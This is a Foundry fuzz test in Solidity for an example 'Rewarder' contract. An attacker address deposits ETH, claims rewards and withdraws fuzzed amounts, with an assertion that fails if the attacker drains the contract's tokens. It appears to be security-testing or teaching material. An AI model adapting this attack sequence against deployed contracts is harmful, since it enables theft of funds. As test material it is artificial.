// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

import "examples/Rewarder/Rewarder.sol";

contract RewarderFuzzing is Test {
    address owner;
    address attacker;
    ERC20Basic token;
    Rewarder rewarder;

    uint256 public attackerInitBalance = 10 ether;
    uint256 public rewarderInitBalance = 100 ether;
    uint256 public rewarderInitToken = 100 ether;

    uint256 public requiredToken = rewarderInitToken;

    function setUp() public {
        owner = address(this);
        attacker = address(0xdeadbeef);
        vm.deal(attacker, attackerInitBalance);

        token = new ERC20Basic(1000 ether);
        rewarder = new Rewarder{value: rewarderInitBalance}(address(token));

        token.transfer(address(rewarder), rewarderInitToken);
    }

    function addressSelector(uint256 e) public returns (address) {
        address[4] memory addresses = [
            address(0),
            attacker,
            address(token),
            address(rewarder)
        ];
        e = bound(e, 0, addresses.length - 1);
        return addresses[e];
    }

    function testAttackGT() public {
        testAttack(1 ether, rewarderInitToken);
    }

    function testAttack(
        uint256 v0,
        uint256 v1
    ) public {
        bool succeed;
        bytes memory call_data;
        vm.startPrank(attacker);

        call_data = abi.encodeWithSignature("depositETH()");
        (succeed, ) = address(rewarder).call{value: v0}(call_data);
        if (succeed) {
            call_data = abi.encodeWithSignature("claimReward()");
            (succeed, ) = address(rewarder).call(call_data);
            if (succeed) {
                emit log_named_uint("Attacker.deposit: ", rewarder.deposit(attacker));
                call_data = abi.encodeWithSignature("withdraw(uint256)", v1);
                (succeed, ) = address(rewarder).call(call_data);
                if (succeed) {
                    assert(token.balanceOf(attacker) < requiredToken);
                }
            }
        }
        vm.stopPrank();
    }
}